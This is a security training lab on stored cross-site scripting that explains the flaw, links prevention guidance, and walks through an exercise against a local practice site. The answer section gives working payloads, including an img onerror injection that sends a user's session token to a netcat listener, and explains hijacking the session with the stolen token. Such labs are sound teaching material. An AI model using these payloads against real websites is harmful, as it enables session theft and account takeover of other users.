# XSS - Cross Site Scripting

XSS or Cross site scripting is one of the most common vulnerabilities and also one that plagues developers of client side applications in JavaScript. With so many frameworks out there, it becomes challenging to determine what is being rendered and how. A stored XSS attack is one in which an attacker is able to inject arbitrary JavaScript onto a page and have that JavaScript be rendered by another user.

This is especially dangerous on pages that have some type of authentication since authentication tokens can easily be sent to another site via JavaScript.

The best ways to prevent XSS are all cataloged here:
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md

**TL;DR: Sanitize all values just before you render them.**

Example:
You have an HTML template you would like to render with a username value as a `data` attribute such as this:

```
<div data-username="<%= @username %>">
...
</div>
```

If the user is able to update their username value, which is stored on the server, they could adjust the HTML to run their own scripts on others' computers on your site:

```
"><script>alert('pwned!')</script><div class="
```


# Lab

Navigate to http://localhost:1337 and you'll be presented with a login page. Now that we have `rick`'s password, let's use that to log into the site. Let's try adding some comments and see what we can do.

<details>
  <summary>Answer</summary>

  It turns out that the comment field is only minimally sanitized before the page renders. This is extremely common especially when sites want to allow users to insert their own HTML for things like adding photos, customizing rich text documents like blogs or creating branded emails.

  As a test, what we can do is something like this:

  ```
  <script>alert('pwned')</script>
  ```

  We notice that the comment is not even rendered. We can open up the developer panel on the right and inspect the JavaScript for `index.js`. We notice that the developer only "sanitized" by removing the ablity for the script tag, but there are many other ways to execute an XSS attack.

  For a fairly comprehensive listing of how this can be achieved, have a look at: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

  Now let's try something a bit more nasty. An alert is silly and fun but what if you wanted to make a quick and easy credential grab after you execute an XSS vulnerability.

  In a terminal, let's start a `netcat` listener:

  * On Mac: `sudo nc -l 18200`
  * On Linux: `sudo nc -l -p 18200`
  * On Windows (as Administrator): `nc -l -p 18200`

  Now let's try to grab the session token from localStorage (this could just as easily be `document.cookie`)

  ```
  <img src="." onerror=$.get('http://localhost:18200/'+localStorage.jwt)>"
  ```

  Since that HTML doesn't have `<script>` in it, it passes and renders creating an HTTP request to your listener on your localhost that looks something like this:

  ```
  $ sudo nc -l 18200
  OPTIONS /eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyaWNrIn0.lLdv2SY2TWzzXVKSahFDWPLcUHwpXpjsLnhwo0ioRFM HTTP/1.1
  Host: localhost:18200
  Connection: keep-alive
  Access-Control-Request-Method: GET
  Origin: null
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36
  Access-Control-Request-Headers: x-auth-token
  Accept: */*
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-US,en;q=0.9
  ```

  That bit after options is the valid [jwt](https://jwt.io) token sent via the URL path which will allow access to the site. As an attacker, all you have to do is set your own `localStorage.jwt` value to that string in your browser and you're in without even needing to knowing the password. That being said, for most sessions, you'll only have access until the session has timed out, but for many sites, this is  plenty of time to do significant damage.

  **Followup Question** What are some ways you can think of to add security controls to prevent damage even if a session token is compromised?
</details>
